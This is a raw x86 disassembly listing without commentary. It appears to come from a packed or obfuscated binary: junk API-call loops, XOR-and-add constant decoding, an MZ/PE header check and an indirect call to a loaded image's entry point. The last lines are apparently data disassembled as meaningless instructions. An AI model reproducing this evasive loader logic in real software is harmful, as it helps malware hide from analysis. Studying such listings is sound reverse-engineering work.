  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	fild   QWORD PTR [esi+esi*2+0x7e250577]
  40a7bb:	jle    0x40a782
  40a7bd:	jg     0x40a83d
  40a7bf:	jle    0x40a764
  40a7c1:	mov    ebp,0x81b56a35
  40a7c6:	mov    edx,0x8196f356
  40a7cb:	jb     0x40a815
  40a7cd:	mov    cl,0x21
  40a7cf:	ins    BYTE PTR es:[edi],dx
  40a7d0:	mov    eax,ds:0xf2f00b2f
  40a7d5:	push   esp
  40a7d6:	jmp    0x40a77e
  40a7d8:	(bad)
  40a7db:	or     DWORD PTR [ebp+0x46895f12],edx
  40a7e1:	push   ebx
  40a7e2:	xchg   DWORD PTR [ebx+0x5ee0bc23],esp
  40a7e8:	out    dx,eax
  40a7e9:	out    0xe,al
  40a7eb:	out    0x38,eax
  40a7ed:	inc    esi
  40a7ee:	pop    es
  40a7ef:	aaa    
  40a7f0:	ins    DWORD PTR es:[edi],dx
  40a7f1:	jecxz  0x40a7aa
  40a7f3:	fsub   DWORD PTR [ebp+0x44]
  40a7f6:	and    BYTE PTR [ecx],ah
  40a7f8:	add    ah,BYTE PTR [ebx+0x5a]
  40a7fb:	sbb    ebx,DWORD PTR [edx]
  40a7fd:	sahf   
  40a7fe:	xchg   esi,eax
  40a7ff:	aad    0x2b
  40a801:	pop    ds
  40a802:	jmp    0x8e3c:0xcbd2e09c
  40a809:	push   ecx
  40a80a:	pop    esp
  40a80b:	gs cwde 
  40a80d:	and    DWORD PTR [eax+0x36],ebx
  40a810:	pushf  
  40a811:	addr16 clc 
  40a813:	jbe    0x40a844
  40a815:	sti    
  40a816:	shr    BYTE PTR [ebx+0x6f],cl
  40a819:	je     0x40a896
  40a81b:	sti    
  40a81c:	cmp    al,0xdc
  40a81e:	rcr    BYTE PTR [edx+eiz*1-0x5],0xf1
  40a823:	outs   dx,BYTE PTR ds:[esi]
  40a824:	jecxz  0x40a7f4
  40a826:	mov    bh,0x59
  40a828:	in     al,dx
  40a829:	mov    esp,ebx
  40a82b:	xchg   ecx,eax
  40a82c:	inc    ebp
  40a82d:	jne    0x40a84b
  40a82f:	repnz mov ebx,DWORD PTR [ebx]
  40a832:	call   0xd8b8:0x41c093d6
  40a839:	push   ecx
  40a83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a83b:	ret    
  40a83c:	loop   0x40a867
  40a83e:	add    BYTE PTR [ecx+0x18],cl
  40a841:	jg     0x40a875
  40a843:	jbe    0x40a813
